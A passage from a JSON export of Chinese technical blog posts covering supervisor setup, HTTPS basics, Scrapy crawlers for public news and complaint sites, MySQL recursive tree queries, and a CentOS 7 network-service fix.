supervisor的守护进程服务（用于接收进程管理命令）<br><code>supervisorctl</code> 客户端（用于和守护进程通信，发送管理进程的指令）<br><code>echo_supervisord_conf</code> 生成初始配置文件程序。</blockquote>\n\n<p>将配置文件重定向到/etc/目录下面</p>\n\n<pre class=\"has\">\n<code>mkdir /etc/supervisor\necho_supervisord_conf &gt; /etc/supervisor/supervisord.conf\n</code></pre>\n\n<p>默认配置文件在<code>/etc/supervisor/supervisord.conf</code> 。<br>\n编辑配置文件：找到最后一行，引入自定义配置文件</p>\n\n<pre class=\"has\">\n<code>;[include]\n;files = conf.d/*.ini</code></pre>\n\n<p>去掉<code>[include]</code>和<code>files</code>前面的“<code>;</code>” include生效,在<code>/etc/supervisor/</code>下创建<code>conf.d</code>文件夹，在其中添加类似<code>ubuntu</code>中配置文件。</p>\n\n<pre class=\"has\">\n<code>mkdir conf.d\n</code></pre>\n\n<blockquote>启动：<br><code>supervisord</code> 启动supervisor <br><code>supervisorctl</code> 控制supervisord<br>\n启动后会看到一堆信息，但是不影响。</blockquote>\n\n<pre class=\"has\">\n<code>/usr/lib/python2.7/site-packages/supervisor/options.py:296: UserWarning: \nSupervisord is running as root and it is searching for its configuration file \nin default locations (including its current working directory); \nyou probably want to specify a \"-c\" argument specifying an absolute path \nto a configuration file for improved security.\n  'Supervisord is running as root and it is searching '\n</code></pre>\n\n<p>可指定配置文件： <code>supervisord -c /etc/supervisord.conf</code></p>\n\n<p>每次修改配置后都需要重启<code>supervisor</code>才能生效</p>\n\n<pre class=\"has\">\n<code>supervisorctl reload \n</code></pre>\n\n<p>监控状态：</p>\n\n<pre class=\"has\">\n<code>supervisorctl status\n</code></pre>\n\n<hr><p>附一个sqs错误处理,redis方式不使用sqs</p>\n\n<pre class=\"has\">\n<code>In SqsConnector.php line 26:\n                                       \n  Class 'Aws\\Sqs\\SqsClient' not found </code></pre>\n\n<p><img alt=\"clipboard.png\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zZWdtZW50ZmF1bHQuY29tL2ltZy9iVmJieG5M?x-oss-process=image/format,png\"></p>\n\n<p>使用 composer 安装：</p>\n\n<pre class=\"has\">\n<code>composer require aws/aws-sdk-php-laravel</code></pre>\n                                    </div>", "log_PostTime": 1584891239, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "HTTPS工作原理", "log_Intro": "HTTPS工作原理", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p><strong>前言</strong></p>\n\n<p>最近在面试中被问到了HTTPS的相关问题，加上密码学也刚好学到公钥密码学，我就趁热打铁，整理一下HTTPS相关知识。</p>\n\n<p>1.HTTPS简介</p>\n\n<p>HTTPS（全称：Hyper Text Transfer Protocol over Secure Socket Layer），是以安全为目标的<a href=\"https://baike.baidu.com/item/HTTP\">HTTP</a>通道，简单讲是HTTP的安全版。下图描述了在TCP/IP协议栈中TLS(各子协议）和HTTP的关系。</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy84MDY2NTY1LTY5YzM5MzMxMzMzZmM3ODMuanBnP2ltYWdlTW9ncjIvYXV0by1vcmllbnQvc3RyaXB8aW1hZ2VWaWV3Mi8yL3cvMzk2L2Zvcm1hdC93ZWJw?x-oss-process=image/format,png\"></p>\n\n<p>https.jpg</p>\n\n<p> </p>\n\n<p>不使用SSL/TLS的HTTP通信，就是不加密的通信。所有信息明文传播，带来了三大风险。</p>\n\n<pre class=\"has\">\n<code>（1） 窃听风险（eavesdropping）：第三方可以获知通信内容。\n（2） 篡改风险（tampering）：第三方可以修改通信内容。\n（3） 冒充风险（pretending）：第三方可以冒充他人身份参与通信。\n</code></pre>\n\n<p>SSL/TLS协议是为了解决这三大风险而设计的，希望达到：</p>\n\n<pre class=\"has\">\n<code>（1） 所有信息都是加密传播，第三方无法窃听。\n（2） 具有校验机制，一旦被篡改，通信双方会立刻发现。\n（3） 配备身份证书，防止身份被冒充。\n</code></pre>\n\n<p>如果你对HTTP协议还不是很了解，可以先看看我整理的</p>                                    </div>", "log_PostTime": 1584891239, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Python:阳光热线问政平台爬虫", "log_Intro": "Python:阳光热线问政平台爬虫", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>爬取投诉帖子的编号、帖子的url、帖子的标题，和帖子里的内容。</p>\n\n<h3 id=\"itemspy\">items.py</h3>\n\n<pre class=\"has\">\n<code class=\"language-python\">import scrapy\n\nclass DongguanItem(scrapy.Item):\n    # 每个帖子的标题\n    title = scrapy.Field()\n    # 每个帖子的编号\n    number = scrapy.Field()\n    # 每个帖子的文字内容\n    content = scrapy.Field()\n    # 每个帖子的url\n    url = scrapy.Field()\n</code></pre>\n\n<h3 id=\"spiderssunwzpy\">spiders/sunwz.py</h3>\n\n<p>Spider 版本</p>\n\n<pre class=\"has\">\n<code class=\"language-python\"># -*- coding: utf-8 -*-\n\nimport scrapy\nfrom dongguan.items import DongguanItem\n\nclass SunSpider(CrawlSpider):\n    name = 'sun'\n    allowed_domains = ['wz.sun0769.com']\n    url = 'http://wz.sun0769.com/index.php/question/questionType?type=4&amp;page='\n    offset = 0\n    start_urls = [url + str(offset)]\n\n    def parse(self, response):\n        # 取出每个页面里帖子链接列表\n        links = response.xpath(\"//div[@class='greyframe']/table//td/a[@class='news14']/@href\").extract()\n        # 迭代发送每个帖子的请求，调用parse_item方法处理\n        for link in links:\n            yield scrapy.Request(link, callback = self.parse_item)\n        # 设置页码终止条件，并且每次发送新的页面请求调用parse方法处理\n        if self.offset &lt;= 71130:\n            self.offset += 30\n            yield scrapy.Request(self.url + str(self.offset), callback = self.parse)\n\n    # 处理每个帖子里\n    def parse_item(self, response):\n        item = DongguanItem()\n        # 标题\n        item['title'] = response.xpath('//div[contains(@class, \"pagecenter p3\")]//strong/text()').extract()[0]\n\n        # 编号\n        item['number'] = item['title'].split(' ')[-1].split(\":\")[-1]\n\n        # 文字内容，默认先取出有图片情况下的文字内容列表\n        content = response.xpath('//div[@class=\"contentext\"]/text()').extract()\n        # 如果没有内容，则取出没有图片情况下的文字内容列表\n        if len(content) == 0:\n            content = response.xpath('//div[@class=\"c1 text14_2\"]/text()').extract()\n            # content为列表，通过join方法拼接为字符串，并去除首尾空格\n            item['content'] = \"\".join(content).strip()\n        else:\n            item['content'] = \"\".join(content).strip()\n\n        # 链接\n        item['url'] = response.url\n\n        yield item\n</code></pre>\n\n<p>CrawlSpider 版本</p>\n\n<pre class=\"has\">\n<code class=\"language-python\">\n# -*- coding: utf-8 -*-\nimport scrapy\nfrom scrapy.linkextractors import LinkExtractor\nfrom scrapy.spiders import CrawlSpider, Rule\nfrom dongguan.items import DongguanItem\nimport time\n\n\nclass SunSpider(CrawlSpider):\n    name = 'sun'\n    allowed_domains = ['wz.sun0769.com']\n    start_urls = ['http://wz.sun0769.com/index.php/question/questionType?type=4&amp;page=']\n\n    # 每一页的匹配规则\n    pagelink = LinkExtractor(allow=('type=4'))\n    # 每个帖子的匹配规则\n    contentlink = LinkExtractor(allow=r'/html/question/\\d+/\\d+.shtml')\n\n    rules = [\n        # 本案例为特殊情况，需要调用deal_links方法处理每个页面里的链接\n        Rule(pagelink, process_links = \"deal_links\", follow = True),\n        Rule(contentlink, callback = 'parse_item')\n    ]\n\n    # 需要重新处理每个页面里的链接，将链接里的‘Type&amp;type=4?page=xxx’替换为‘Type?type=4&amp;page=xxx’（或者是Type&amp;page=xxx?type=4’替换为‘Type?page=xxx&amp;type=4’），否则无法发送这个链接\n    def deal_links(self, links):\n        for link in links:\n            link.url = link.url.replace(\"?\",\"&amp;\").replace(\"Type&amp;\", \"Type?\")\n            print link.url\n        return links\n\n\n    def parse_item(self, response):\n        print response.url\n        item = DongguanItem()\n        # 标题\n        item['title'] = response.xpath('//div[contains(@class, \"pagecenter p3\")]//strong/text()').extract()[0]\n\n        # 编号\n        item['number'] = item['title'].split(' ')[-1].split(\":\")[-1]\n\n        # 文字内容，默认先取出有图片情况下的文字内容列表\n        content = response.xpath('//div[@class=\"contentext\"]/text()').extract()\n        # 如果没有内容，则取出没有图片情况下的文字内容列表\n        if len(content) == 0:\n            content = response.xpath('//div[@class=\"c1 text14_2\"]/text()').extract()\n            # content为列表，通过join方法拼接为字符串，并去除首尾空格\n            item['content'] = \"\".join(content).strip()\n        else:\n            item['content'] = \"\".join(content).strip()\n\n        # 链接\n        item['url'] = response.url\n\n        yield item\n</code></pre>\n\n<p>pipelines.py</p>\n\n<pre class=\"has\">\n<code class=\"language-python\"># -*- coding: utf-8 -*-\n\n# 文件处理类库，可以指定编码格式\nimport codecs\nimport json\n\nclass JsonWriterPipeline(object):\n\n    def __init__(self):\n        # 创建一个只写文件，指定文本编码格式为utf-8\n        self.filename = codecs.open('sunwz.json', 'w', encoding='utf-8')\n\n    def process_item(self, item, spider):\n        content = json.dumps(dict(item), ensure_ascii=False) + \"\\n\"\n        self.filename.write(content)\n        return item\n\n    def spider_closed(self, spider):\n        self.file.close()\n</code></pre>\n\n<p>settings.py</p>\n\n<pre class=\"has\">\n<code class=\"language-python\">ITEM_PIPELINES = {\n    'dongguan.pipelines.DongguanPipeline': 300,\n}\n\n# 日志文件名和处理等级\nLOG_FILE = \"dg.log\"\nLOG_LEVEL = \"DEBUG\"\n</code></pre>\n\n<p>在项目根目录下新建main.py文件,用于调试</p>\n\n<pre class=\"has\">\n<code class=\"language-python\">from scrapy import cmdline\ncmdline.execute('scrapy crawl sunwz'.split())\n</code></pre>\n\n<p>执行程序</p>\n\n<pre class=\"has\">\n<code>py2 main.py</code></pre>\n                                    </div>", "log_PostTime": 1584891240, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Mysql中的递归层次查询（父子查询,无限极查询）", "log_Intro": "Mysql中的递归层次查询（父子查询,无限极查询）", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p><strong>前言：</strong>最近面试的时候遇到公司要求只能用SQL来查询无限极的数据，不能用PHP程序做递归查询，现在分享方法。</p>\n\n<p>下面给出一个<strong><code>function</code></strong>来完成的方法<br><a id=\"more\"></a></p>\n\n<p>下面是sql脚本，想要运行的直接赋值粘贴进数据库即可。</p>\n\n<pre class=\"has\">\n<code class=\"language-sql\">-- ---------------------------- \n-- Table structure for `treenodes` \n-- ---------------------------- \nDROP TABLE IF EXISTS `treenodes`; \nCREATE TABLE `treenodes` ( \n  `id` int(11) NOT NULL, \n  `nodename` varchar(20) DEFAULT NULL, \n  `pid` int(11) DEFAULT NULL, \n  PRIMARY KEY (`id`) \n) ENGINE=InnoDB DEFAULT CHARSET=latin1;</code></pre>\n\n<pre class=\"has\">\n<code class=\"language-sql\">-- ---------------------------- \n-- Records of treenodes \n-- ---------------------------- \nINSERT INTO `treenodes` VALUES ('1', 'A', '0'); \nINSERT INTO `treenodes` VALUES ('2', 'B', '1'); \nINSERT INTO `treenodes` VALUES ('3', 'C', '1'); \nINSERT INTO `treenodes` VALUES ('4', 'D', '2'); \nINSERT INTO `treenodes` VALUES ('5', 'E', '2'); \nINSERT INTO `treenodes` VALUES ('6', 'F', '3'); \nINSERT INTO `treenodes` VALUES ('7', 'G', '6'); \nINSERT INTO `treenodes` VALUES ('8', 'H', '0'); \nINSERT INTO `treenodes` VALUES ('9', 'I', '8'); \nINSERT INTO `treenodes` VALUES ('10', 'J', '8'); \nINSERT INTO `treenodes` VALUES ('11', 'K', '8'); \nINSERT INTO `treenodes` VALUES ('12', 'L', '9'); \nINSERT INTO `treenodes` VALUES ('13', 'M', '9'); \nINSERT INTO `treenodes` VALUES ('14', 'N', '12'); \nINSERT INTO `treenodes` VALUES ('15', 'O', '12'); \nINSERT INTO `treenodes` VALUES ('16', 'P', '15'); \nINSERT INTO `treenodes` VALUES ('17', 'Q', '15');</code></pre>\n\n<p>把下面的语句直接粘贴进命令行执行即可（注意修改传入的参数，默认rootId，表明默认treenodes）</p>\n\n<h3><strong>根据传入id查询所有父节点的id</strong></h3>\n\n<p><strong>方法1:</strong></p>\n\n<p>级数不知道，可以用类似下面这个语句查询, <code>@r := 6</code>为查询条件</p>\n\n<pre class=\"has\">\n<code class=\"language-sql\">SELECT T2.id, T2.nodename, T2.pid\nFROM ( \n    SELECT \n        @r AS _id, \n        (SELECT @r := pid FROM treenodes WHERE id = _id) AS pid, \n        @l := @l + 1 AS l\n    FROM \n        (SELECT @r := 6, @l := 0) vars, \n        treenodes h \n    WHERE @r != 0) T1 \nJOIN treenodes T2 \nON T1._id = T2.id \nORDER BY T1.l;</code></pre>\n\n<p><strong>结果:</strong></p>\n\n<p> <img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191117012100506.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<p><strong>方法2:</strong></p>\n\n<pre class=\"has\">\n<code class=\"language-sql\">delimiter // \nCREATE FUNCTION `getParList`(rootId INT)\nRETURNS varchar(1000) \n\nBEGIN\n\tDECLARE sTemp VARCHAR(1000);\n\tDECLARE sTempPar VARCHAR(1000); \n\tSET sTemp = ''; \n\tSET sTempPar =rootId; \n\t\n\t#循环递归\n\tWHILE sTempPar is not null DO \n\t\t#判断是否是第一个，不加的话第一个会为空\n\t\tIF sTemp != '' THEN\n\t\t\tSET sTemp = concat(sTemp,',',sTempPar);\n\t\tELSE\n\t\t\tSET sTemp = sTempPar;\n\t\tEND IF;\n\n\t\tSET sTemp = concat(sTemp,',',sTempPar); \n\t\tSELECT group_concat(pid) INTO sTempPar FROM treenodes where pid&lt;&gt;id and FIND_IN_SET(id,sTempPar)&gt;0; \n\tEND WHILE; \n\t\nRETURN sTemp; \nEND\n//</code></pre>\n\n<p><strong>执行命令</strong></p>\n\n<pre class=\"has\">\n<code class=\"language-sql\">select * from treenodes where FIND_IN_SET(id,getParList(15));</code></pre>\n\n<p><strong>结果： </strong></p>\n\n<p> <img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191117010146953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<h3><strong>根据传入id查询所有子节点的id</strong></h3>\n\n<pre class=\"has\">\n<code class=\"language-sql\">delimiter // \nCREATE FUNCTION `getChildList`(rootId INT)\nRETURNS varchar(1000) \n\nBEGIN\n\tDECLARE sTemp VARCHAR(1000);\n    DECLARE sTempChd VARCHAR(1000);\n\n    SET sTemp = '$';\n    SET sTempChd =cast(rootId as CHAR);\n\n    WHILE sTempChd is not null DO\n    \tSET sTemp = concat(sTemp,',',sTempChd);\n        SELECT group_concat(id) INTO sTempChd FROM  treeNodes where FIND_IN_SET(pid,sTempChd)&gt;0;\n   \tEND WHILE;\n    RETURN sTemp; \nEND\n//</code></pre>\n\n<p><strong>执行命令</strong></p>\n\n<pre class=\"has\">\n<code class=\"language-sql\">select * from treenodes where FIND_IN_SET(id,getChildList(7));\n</code></pre>\n\n<p><strong>结果：</strong></p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191117010639798.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<p> </p>\n                                    </div>", "log_PostTime": 1584891241, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Python:新浪网分类资讯爬虫", "log_Intro": "Python:新浪网分类资讯爬虫", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <blockquote>\n<p>爬取新浪网导航页所有下所有大类、小类、小类里的子链接，以及子链接页面的新闻内容。</p>\n\n<p>效果演示图：</p>\n</blockquote>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191117214856397.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"> </p>\n\n<p> </p>\n\n<p>items.py</p>\n\n<pre class=\"has\">\n<code>import scrapy\nimport sys\nreload(sys)\nsys.setdefaultencoding(\"utf-8\")\n\nclass SinaItem(scrapy.Item):\n    # 大类的标题 和 url\n    parentTitle = scrapy.Field()\n    parentUrls = scrapy.Field()\n\n    # 小类的标题 和 子url\n    subTitle = scrapy.Field()\n    subUrls = scrapy.Field()\n\n    # 小类目录存储路径\n    subFilename = scrapy.Field()\n\n    # 小类下的子链接\n    sonUrls = scrapy.Field()\n\n    # 文章标题和内容\n    head = scrapy.Field()\n    content = scrapy.Field()\n</code></pre>\n\n<p>spiders/sina.py</p>\n\n<pre class=\"has\">\n<code># -*- coding: utf-8 -*-\n# -*- coding: utf-8 -*-\n\nfrom Sina.items import SinaItem\nimport scrapy\nimport os\n\nimport sys\nreload(sys)\nsys.setdefaultencoding(\"utf-8\")\n\n\nclass SinaSpider(scrapy.Spider):\n    name= \"sina\"\n    allowed_domains= [\"sina.com.cn\"]\n    start_urls= [\n       \"http://news.sina.com.cn/guide/\"\n    ]\n\n    def parse(self, response):\n        items= []\n        # 所有大类的url 和 标题\n        parentUrls = response.xpath('//div[@id=\\\"tab01\\\"]/div/h3/a/@href').extract()\n        parentTitle = response.xpath(\"//div[@id=\\\"tab01\\\"]/div/h3/a/text()\").extract()\n\n        # 所有小类的ur 和 标题\n        subUrls  = response.xpath('//div[@id=\\\"tab01\\\"]/div/ul/li/a/@href').extract()\n        subTitle = response.xpath('//div[@id=\\\"tab01\\\"]/div/ul/li/a/text()').extract()\n\n        #爬取所有大类\n        for i in range(0, len(parentTitle)):\n            # 指定大类目录的路径和目录名\n            parentFilename = \"./Data/\" + parentTitle[i]\n\n            #如果目录不存在，则创建目录\n            if(not os.path.exists(parentFilename)):\n                os.makedirs(parentFilename)\n\n            # 爬取所有小类\n            for j in range(0, len(subUrls)):\n                item = SinaItem()\n\n                # 保存大类的title和urls\n                item['parentTitle'] = parentTitle[i]\n                item['parentUrls'] = parentUrls[i]\n\n                # 检查小类的url是否以同类别大类url开头，如果是返回True (sports.sina.com.cn 和 sports.sina.com.cn/nba)\n                if_belong = subUrls[j].startswith(item['parentUrls'])\n\n                # 如果属于本大类，将存储目录放在本大类目录下\n                if(if_belong):\n                    subFilename =parentFilename + '/'+ subTitle[j]\n                    # 如果目录不存在，则创建目录\n                    if(not os.path.exists(subFilename)):\n                        os.makedirs(subFilename)\n\n                    # 存储 小类url、title和filename字段数据\n                    item['subUrls'] = subUrls[j]\n                    item['subTitle'] =subTitle[j]\n                    item['subFilename'] = subFilename\n\n                    items.append(item)\n\n        #发送每个小类url的Request请求，得到Response连同包含meta数据 一同交给回调函数 second_parse 方法处理\n        for item in items:\n            yield scrapy.Request( url = item['subUrls'], meta={'meta_1': item}, callback=self.second_parse)\n\n    #对于返回的小类的url，再进行递归请求\n    def second_parse(self, response):\n        # 提取每次Response的meta数据\n        meta_1= response.meta['meta_1']\n\n        # 取出小类里所有子链接\n        sonUrls = response.xpath('//a/@href').extract()\n\n        items= []\n        for i in range(0, len(sonUrls)):\n            # 检查每个链接是否以大类url开头、以.shtml结尾，如果是返回True\n            if_belong = sonUrls[i].endswith('.shtml') and sonUrls[i].startswith(meta_1['parentUrls'])\n\n            # 如果属于本大类，获取字段值放在同一个item下便于传输\n            if(if_belong):\n                item = SinaItem()\n                item['parentTitle'] =meta_1['parentTitle']\n                item['parentUrls'] =meta_1['parentUrls']\n                item['subUrls'] = meta_1['subUrls']\n                item['subTitle'] = meta_1['subTitle']\n                item['subFilename'] = meta_1['subFilename']\n                item['sonUrls'] = sonUrls[i]\n                items.append(item)\n\n        #发送每个小类下子链接url的Request请求，得到Response后连同包含meta数据 一同交给回调函数 detail_parse 方法处理\n        for item in items:\n                yield scrapy.Request(url=item['sonUrls'], meta={'meta_2':item}, callback = self.detail_parse)\n\n    # 数据解析方法，获取文章标题和内容\n    def detail_parse(self, response):\n        item = response.meta['meta_2']\n        content = \"\"\n        head = response.xpath('//h1[@id=\\\"main_title\\\"]/text()')\n        content_list = response.xpath('//div[@id=\\\"artibody\\\"]/p/text()').extract()\n\n        # 将p标签里的文本内容合并到一起\n        for content_one in content_list:\n            content += content_one\n\n        item['head']= head\n        item['content']= content\n\n        yield item\n</code></pre>\n\n<p>pipelines.py</p>\n\n<pre class=\"has\">\n<code>from scrapy import signals\nimport sys\nreload(sys)\nsys.setdefaultencoding(\"utf-8\")\n\nclass SinaPipeline(object):\n    def process_item(self, item, spider):\n        sonUrls = item['sonUrls']\n\n        # 文件名为子链接url中间部分，并将 / 替换为 _，保存为 .txt格式\n        filename = sonUrls[7:-6].replace('/','_')\n        filename += \".txt\"\n\n        fp = open(item['subFilename']+'/'+filename, 'w')\n        fp.write(item['content'])\n        fp.close()\n\n        return item\n</code></pre>\n\n<p>settings.py</p>\n\n<pre class=\"has\">\n<code class=\"language-python\">BOT_NAME = 'Sina'\n\nSPIDER_MODULES = ['Sina.spiders']\nNEWSPIDER_MODULE = 'Sina.spiders'\n\nITEM_PIPELINES = {\n    'Sina.pipelines.SinaPipeline': 300,\n}\n\nLOG_LEVEL = 'DEBUG'\n</code></pre>\n\n<p>在项目根目录下新建main.py文件,用于调试</p>\n\n<pre class=\"has\">\n<code>from scrapy import cmdline\ncmdline.execute('scrapy crawl sina'.split())\n</code></pre>\n\n<p>执行程序</p>\n\n<pre class=\"has\">\n<code>py2 main.py</code></pre>\n                                    </div>", "log_PostTime": 1584891242, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "CentOS7 service network start命令启动时报错解决方法", "log_Intro": "CentOS7 service network start命令启动时报错解决方法", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p><strong>service network start</strong>命令启动时报错：</p>\n\n<p>[root@localhost network-scripts]# service network start</p>\n\n<p>Starting network (via systemctl):  Job for network.service failed. See 'systemctl status network.service' and 'journalctl -xn' for details.[FAILED][root@localhost network-scripts]# systemctl status network.servicenetwork.service - LSB: Bring up/down networking   Loaded: loaded (/etc/rc.d/init.d/network)   Active: failed (Result: exit-code) since Sat 2015-03-07 02:53:12 EST; 6s ago  Process: 8596 ExecStart=/etc/rc.d/init.d/network start (code=exited, status=1/FAILURE)Mar 07 02:53:12 localhost.localdomain network[8596]: RTNETLINK answers: File ...Mar 07 02:53:12 localhost.localdomain network[8596]: RTNETLINK answers: File ...Mar 07 02:53:12 localhost.localdomain network[8596]: RTNETLINK answers: File ...Mar 07 02:53:12 localhost.localdomain network[8596]: RTNETLINK answers: File ...Mar 07 02:53:12 localhost.localdomain network[8596]: RTNETLINK answers: File ...Mar 07 02:53:12 localhost.localdomain network[8596]: RTNETLINK answers: File ...Mar 07 02:53:12 localhost.localdomain systemd-sysctl[8913]: Overwriting earli...Mar 07 02:53:12 localhost.localdomain systemd[1]: network.service: control pr...Mar 07 02:53:12 localhost.localdomain systemd[1]: Failed to start LSB: Bring ...Mar 07 02:53:12 localhost.localdomain systemd[1]: Unit network.service entere...Hint: Some lines were ellipsized, use -l to show in full.</p>\n\n<p> </p>\n\n<p>然后网上搜是因为没加HWADDR....这个我确实给删了....</p>\n\n<p>先看log里说哪个网卡没有UP起来：</p>\n\n<p> </p>\n\n<p>[root@localhost network-scripts]# cat /var/log/messages | grep network</p>\n\n<p>Mar  7 03:05:18 localhost kernel: drop_monitor: Initializing network drop monitor serviceMar  7 03:05:19 localhost systemd-udevd[413]: renamed network interface eth1 to enp1s0f1Mar  7 03:05:19 localhost systemd-udevd[416]: renamed network interface eth5 to enp8s0f3Mar  7 03:05:19 localhost systemd-udevd[421]: renamed network interface eth3 to enp8s0f1Mar  7 03:05:19 localhost systemd-udevd[429]: renamed network interface eth4 to enp8s0f2Mar  7 03:05:19 localhost systemd-udevd[411]: renamed network interface eth0 to enp1s0f0Mar  7 03:05:19 localhost systemd-udevd[419]: renamed network interface eth2 to enp8s0f0Mar  7 03:05:25 localhost systemd-udevd[412]: renamed network interface eth1 to enp3s0f1Mar  7 03:05:25 localhost systemd-udevd[414]: renamed network interface eth3 to enp131s0f1Mar  7 03:05:25 localhost systemd-udevd[411]: renamed network interface eth0 to enp3s0f0Mar  7 03:05:25 localhost systemd-udevd[413]: renamed network interface eth2 to enp131s0f0Mar  7 03:05:25 localhost systemd-udevd[415]: renamed network interface eth4 to enp134s0f0Mar  7 03:05:25 localhost systemd-udevd[416]: renamed network interface eth5 to enp134s0f1Mar  7 03:05:30 localhost systemd: Starting Import network configuration from initramfs...Mar  7 03:05:30 localhost systemd: Started Import network configuration from initramfs.Mar  7 03:05:40 localhost systemd: Starting Rollback uncommitted netcf network config change transactions...Mar  7 03:05:40 localhost systemd: Started Rollback uncommitted netcf network config change transactions.Mar  7 03:05:43 localhost systemd: Starting LSB: Bring up/down networking...Mar  7 03:05:45 localhost network: Bringing up loopback interface:  [  OK  ]Mar  7 03:05:45 localhost network: Bringing up interface br0:  ERROR    : [/etc/sysconfig/network-scripts/ifup-eth] Device br0 does not seem to be present, delaying initialization.Mar  7 03:05:45 localhost /etc/sysconfig/network-scripts/ifup-eth: Device br0 does not seem to be present, delaying initialization.Mar  7 03:05:45 localhost network: [FAILED]Mar  7 03:05:45 localhost network: Bringing up interface enp1s0f0:  [  OK  ]Mar  7 03:05:45 localhost network: Bringing up interface enp8s0f0:  ERROR    : [/etc/sysconfig/network-scripts/ifup-eth] Device  does not seem to be present, delaying initialization.Mar  7 03:05:45 localhost /etc/sysconfig/network-scripts/ifup-eth: Device  does not seem to be present, delaying initialization.Mar  7 03:05:45 localhost network: [FAILED]Mar  7 03:05:45 localhost network: Bringing up interface enp8s0f1:  ERROR    : [/etc/sysconfig/network-scripts/ifup-eth] Device  does not seem to be present, delaying initialization.Mar  7 03:05:45 localhost /etc/sysconfig/network-scripts/ifup-eth: Device  does not seem to be present, delaying initialization.Mar  7 03:05:45 localhost network: [FAILED]Mar  7 03:05:45 localhost systemd: network.service: control process exited, code=exited status=1Mar  7 03:05:45 localhost systemd: Failed to start LSB: Bring up/down networking.Mar  7 03:05:45 localhost systemd: Unit network.service entered failed state.Mar  7 03:05:48 localhost xinetd[1863]: xinetd Version 2.3.15 started with libwrap loadavg labeled-networking options compiled in.</p>\n\n<p><a><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMwLmNuYmxvZ3MuY29tL2Jsb2cyMDE1LzcyODMyNi8yMDE1MDMvMDkxNjA5MDg0MTc5OTM0LnBuZw?x-oss-process=image/format,png\"></a></p>\n\n<p> </p>\n\n<p>ip addr查看这俩网卡的MAC：</p>\n\n<p>[root@localhost network-scripts]# ip addr</p>\n\n<p>1: lo: mtu 65536 qdisc noqueue state UNKNOWN     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00    inet 127.0.0.1/8 scope host lo       valid_lft forever preferred_lft forever    inet6 ::1/128 scope host        valid_lft forever preferred_lft forever2: enp1s0f0: mtu 1500 qdisc mq master br0 state UP qlen 1000    link/ether 00:25:90:64:a9:30 brd ff:ff:ff:ff:ff:ff    inet6 fe80::225:90ff:fe64:a930/64 scope link        valid_lft forever preferred_lft forever3: enp1s0f1: mtu 1500 qdisc noop state DOWN qlen 1000    link/ether 00:25:90:64:a9:31 brd ff:ff:ff:ff:ff:ff4: enp8s0f0: mtu 1500 qdisc noop state DOWN qlen 1000    link/ether 00:0c:bd:05:4e:cc brd ff:ff:ff:ff:ff:ff5: enp8s0f1: mtu 1500 qdisc noop state DOWN qlen 1000    link/ether 00:0c:bd:05:4e:cd brd ff:ff:ff:ff:ff:ff6: enp8s0f2: mtu 1500 qdisc noop state DOWN qlen 1000    link/ether 00:0c:bd:05:4e:ce brd ff:ff:ff:ff:ff:ff7: enp8s0f3: mtu 1500 qdisc noop state DOWN qlen 1000    link/ether 00:0c:bd:05:4e:cf brd ff:ff:ff:ff:ff:ff</p>\n\n<p> </p>\n\n<p>然后把这俩网卡的mac写到配置文件里：</p>\n\n<p>/etc/sysconfig/network-scripts/ifcfg-enp8s0f0</p>\n\n<p>/etc/sysconfig/network-scripts/ifcfg-enp8s0f1</p>\n\n<p>​​</p>\n\n<p>添加：</p>\n\n<p>HWADDR=00:0c:bd:05:4e:cc​</p>\n\n<p> </p>\n\n<p>然后重新启动network，就OK啦！</p>\n\n<p> </p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMwLmNuYmxvZ3MuY29tL2Jsb2cyMDE1LzcyODMyNi8yMDE1MDMvMDkxNjEwMTk2NTI1OTMxLnBuZw?x-oss-process=image/format,png\"></p>\n\n<p> </p>\n\n<p>很久没更新了，其实问题不一定是MAC的问题，也有其他的可能性。下面是另一种情况：</p>\n\n<p>虚拟机里边的CentOS7重启之后无法联网了，重启network发现报错。</p>\n\n<p> </p>\n\n<p>百度了一圈，都是叫修改mac地址的说法，但是改了之后并没有什么用，最后谷歌解决了。</p>\n\n<p>事实证明百度就是个水货！</p>\n\n<p>解决方式：禁用NetworkManager</p>\n\n<p>1. systemctl stop NetworkManager</p>\n\n<p>2. systemctl disable NetworkManager</p>\n\n<p> </p>\n\n<p> 